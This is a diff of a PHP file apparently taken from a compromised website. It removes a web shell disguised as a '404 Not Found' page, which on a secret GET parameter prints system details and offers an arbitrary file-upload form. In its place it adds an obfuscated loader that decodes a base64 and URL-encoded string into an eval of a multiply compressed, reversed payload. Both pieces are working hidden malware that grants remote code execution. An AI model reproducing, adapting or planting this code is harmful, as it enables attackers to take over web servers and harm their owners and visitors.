@@ -1,24 +1,6 @@
-<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
-<html><head>
-<title>404 Not Found</title>
-</head><body>
-<h1>Not Found</h1>
-<p>The requested URL was not found on this server.</p>
-</body></html>
 <?php
-if(isset($_GET["b4t0s4y"]))
- {
-  echo "b4t0s4y"
-  echo"<font color=#ffffff>".php_uname()."";
-  print "\n";$disable_functions = @ini_get("disable_functions"); 
-  echo "<br>DisablePHP=".$disable_functions; print "\n"; 
-  echo"<br><form method=post enctype=multipart/form-data>"; 
-  echo"<input type=file name=f><input name=k type=submit id=k value=upload><br>"; 
-    if($_POST["k"]==upload)
-{ if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){
-echo"<b>".$_FILES["f"]["name"];
-}else{
-echo"<b>Gagal Bro";
-}
-} 
-}
+$unknown = "ZXZhbCUyOCUyNnF1b3QlM0IlM0YlMjZndCUzQiUyNnF1b3QlM0IuZ3p1bmNvbXByZXNzJTI4Z3p1bmNvbXByZXNzJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4YmFzZTY0X2RlY29kZSUyOHN0cnJldiUyOCUyNHVrNDUlMjklMjklMjklMjklMjklMjklMjklMjklM0I=";
+$uk45 = "1aV+2Nuagl5F/PGm7U0H/jOftPY2JIoLv8KDAavVtWfpspQ7MjQaUt510i+gOorNhwPgMHxwaJWsGzZMDeHhRqfjA+XCyFLlGjGi0ONJWnF2gTW6jmAu0MP4TGyXMDeUTv6o/nFzJL4XmkgutIEaSsekkPmUDFZSpSyQejl7F5Cbrv1kHHe4BX90CVTBcCK8PnCy0e5vpoJkq+5+73wNCGKVmiVHpWHTeMsA9MIi+x8KX4dOOrup41jgYR+eDdOACrR1oy1sS2x+lrnl4MOKz6ZGUMyg6BFlmKirMicTA38sja1gZb99OjRSysoRdOoSjIoXG3CUX+yxPlnY4/0T2JRmBr5WQ7lIbTzyTUMXU8V4ukC3yf/AG5s1G077Z+gNGxFmMmPkSOzNGgxPhGCXFySnLck34kjn3LzOdjzNXb8icdEATYU1CU9EyUp5K1cPHbEPDMXkyteDut+K7/j4e9HbMcGhcTVDsUo5K+r6agZ/UWrxVVywz8yLyoE0hBYbK8kYqwkzDVpXxOSFpinN25cuvNPS2nDflVTv5Lk7QGiJAju0Q9rkTYB6w71EDGcoFN8SWIVUjJS6uKG1pXwbSSScSl9YkSS09mVzFUZEoo5TPS1m7p8EiYpBUQU3gkqlA73IA7O7o5NZXd7SNRbWZIMC62ieZq516M5w7m7Us0HolHLVRtCps66u1w09TRjGlbSAEFBLMhEF1kE+DdCTxEGtJfE7QJDm+NJ6aZRL8/gQqyLRuseRuJ6Jrpr7io8LgG2KGW9u+NmJhbpt0U2N+d2kTRn7vL+KDW3ymtPyWb/F32l9QEU33l9AcyhN6hnwagTZAzRd4nX9evp7Xnr755O6iGVY239KoMnv/XdUdtzZxaCvpRsMoIWawEtlCWUobkeIT1WFQbppFEi5h/fqe5PEwo9btJVjciX/JJgtBwJe97jABHQ/5IgxB0PNCscA";
+eval(htmlspecialchars_decode(urldecode(base64_decode($unknown))));
+exit;
+?>
